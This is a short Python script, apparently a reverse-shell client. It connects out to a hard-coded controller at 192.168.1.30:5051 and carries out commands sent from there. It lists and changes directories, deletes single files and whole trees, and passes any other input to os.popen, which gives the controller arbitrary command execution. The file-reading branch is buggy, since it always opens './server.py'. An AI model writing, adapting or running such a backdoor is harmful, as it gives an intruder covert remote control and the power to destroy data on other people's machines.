import socket
import subprocess
import re
import os
from sys import platform
from shutil import rmtree

s = socket.socket()
HOST = "192.168.1.30"
PORT = 5051
SERVER = (HOST, PORT)
FORMAT = "utf-8"
BUFFER = 8192
DC_MSG = "!dc"
s.connect(SERVER)

def getPWD():
    pwd = f'{os.getcwd()}'
    return pwd

cmdList = {}
if platform == "linux" or platform == "linux2":
    cmdList["listCommand"] = "ls"
    cmdList["pwdCommand"] = "pwd"
    cmdList["cdCommand"] = "cd"
    cmdList["fileContentCommand"] = "cat"
elif platform == "win32":
    cmdList["listCommand"] = "dir"
    cmdList["pwdCommand"] = "pwd"
    cmdList["cdCommand"] = "cd"
    cmdList["fileContentCommand"] = "type"

run = True
while run:
    cmd = s.recv(BUFFER).decode(FORMAT)
    if cmd == DC_MSG:
        run = False
        s.close()
    elif re.search("^ls\s?", cmd):
        lsItems = ""
        lsDir = cmd.replace("ls", "")
        lsDir = lsDir.replace(" ", "")
        if len(lsDir) > 1:
            ls = os.listdir(lsDir)
        else:
            ls = os.listdir()

        for item in ls:
            lsItems += item + "\t"
        lsItems += "\n"
        s.send(lsItems.encode(FORMAT))
    elif re.search("^cd ", cmd):
        newCmd = cmd.replace("cd ", "")
        os.chdir(newCmd)
        crrDir = f"Current dir: {getPWD()}\n"
        s.send(crrDir.encode(FORMAT))
    elif re.search("^pwd$", cmd):
        pwd = getPWD() + "\n"
        s.send(pwd.encode(FORMAT))
    elif re.search("^rm -rf ", cmd):
        toRemove = cmd.replace("rm -rf ", "")
        rmtree(toRemove)
    elif re.search("^rm ", cmd):
        toRemove = cmd.replace("rm ", "")
        os.remove(toRemove)
    elif re.search("cat ", cmd):
        catFile = cmd.replace("cat ", "")
        try:
            catFile = "./server.py"
            fileCtn = open(catFile, "r")
            lines = fileCtn.readlines()
            ctn = ""
            for line in lines:
                ctn += line
            s.send(ctn.encode(FORMAT))
        except:
            s.send("File doesnt't exist".encode(FORMAT))
    else:
        os.popen(cmd)


